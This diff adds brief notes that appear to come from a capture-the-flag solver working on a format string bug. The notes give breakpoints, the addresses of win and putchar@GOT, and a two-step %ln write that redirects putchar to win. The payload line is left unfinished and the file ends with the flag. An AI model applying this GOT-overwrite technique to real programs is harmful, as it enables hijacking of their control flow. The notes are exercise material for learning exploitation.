@@ -1,0 +1,19 @@
+b *main+337 printf(name)
+b *main+356 printf(desc)
+
+9$p: ret address
+win: 0x40094c
+putchar@got: 0x602020
+
+
+11$p: environment variable
+
+11$p -> putchar@got
+
+%11$ln -> write putchar@got_address on stack (rsp+0x108)
+
+%33$ln -> write win_address on putchar@
+
+payload = %
+
+FLAG{if_u_used_the_fsb_u_failed}
